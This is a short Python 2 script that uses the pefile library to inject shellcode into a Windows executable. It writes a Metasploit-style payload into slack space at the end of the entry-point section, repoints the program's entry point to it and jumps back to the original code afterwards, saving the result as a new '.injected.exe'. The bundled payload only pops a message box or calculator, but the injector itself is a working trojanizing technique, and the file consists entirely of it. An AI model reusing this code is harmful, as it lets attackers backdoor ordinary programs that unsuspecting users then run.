from pefile import PE
from struct import pack
# windows/messagebox - 265 bytes
# http://www.metasploit.com
# ICON=NO, TITLE=W00t!, EXITFUNC=process, VERBOSE=false, 
# TEXT=Debasish Wnas Here!

sample_shell_code = ( 
"\xe9\x93\x00\x00\x00\x64\xa1\x18\x00\x00\x00\x8b\x40\x30\x8b" 
"\x40\x0c\x8b\x40\x1c\x33\xc9\x8b\x00\x8b\x50\x20\x66\x83\x7a" 
"\x10\x2e\x74\x06\x41\x83\xf9\x02\x7c\xee\x8b\x40\x08\xc3\x55" 
"\x8b\xec\x53\x56\x57\x8b\x7d\x08\x8b\x47\x3c\x8b\x44\x38\x78" 
"\x83\x65\x08\x00\x03\xc7\x8b\x70\x20\x03\xf7\x83\x78\x18\x00" 
"\x76\x2a\x8b\x0e\x03\xcf\x33\xdb\xeb\x09\x6b\xdb\x21\x0f\xbe" 
"\xd2\x03\xda\x41\x8a\x11\x84\xd2\x75\xf1\x3b\x5d\x0c\x74\x15" 
"\x83\xc6\x04\xff\x45\x08\x8b\x4d\x08\x3b\x48\x18\x72\xd6\x33" 
"\xc0\x5f\x5e\x5b\x5d\xc3\x8b\x48\x24\x8b\x55\x08\x8b\x40\x1c" 
"\x8d\x0c\x51\x0f\xb7\x0c\x39\x8d\x04\x88\x8b\x04\x38\x03\xc7" 
"\xeb\xe1\x55\x8b\xec\x51\x51\x83\x65\xfc\x00\xc7\x45\xf8\x63" 
"\x61\x6c\x63\xe8\x58\xff\xff\xff\x6a\x01\x8d\x4d\xf8\x51\x68" 
"\x13\xb9\xe6\x25\x50\xe8\x6e\xff\xff\xff\x59\x59\xff\xd0\xe9" 
"\x02\x00\x00\x00\xc9\xc3"
)

if __name__ == '__main__':
	import sys
	# exe_file = raw_input('[*] Enter full path of the main executable :')
	# final_pe_file = raw_input('[*] Enter full path of the output executable :')
	exe_file = sys.argv[1]
	final_pe_file = sys.argv[1]+".injected.exe"
	pe = PE(exe_file)
	OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	pe_sections = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	align = pe.OPTIONAL_HEADER.SectionAlignment
	what_left = (pe_sections.VirtualAddress + pe_sections.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
	end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
	padd = align - (end_rva % align)
	e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
	scode_size = len(sample_shell_code)+5
	if padd < scode_size:
		# Enough space is not available for shellcode
		exit()
	# Code can be injected
	scode_end_off = e_offset
	scode_start_off = scode_end_off - scode_size
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
	raw_pe_data = pe.write()
	jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
#	sample_shell_code = '\x41\x50%s\x41\x58\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	# sample_shell_code = '\x60%s\x61\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	sample_shell_code = '%s\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
	# sample_shell_code = '\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x50\x51\x52\x53%s\x5b\x5a\x59\x58\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\xe9%s' % (sample_shell_code, pack('I', jmp_to & 0xffffffff))
#        print "".join( '{:02x}'.format(ord(x)) for x in sample_shell_code )
	final_data = list(raw_pe_data)
	final_data[scode_start_off:scode_start_off+len(sample_shell_code)] = sample_shell_code
#	final_data = ''.join(final_data)
	final_data = bytearray(final_data)
	raw_pe_data = final_data
	pe.close()
	new_file = open(final_pe_file, 'wb')
	new_file.write(raw_pe_data)
	new_file.close()
	print '[*] Job Done! :)'
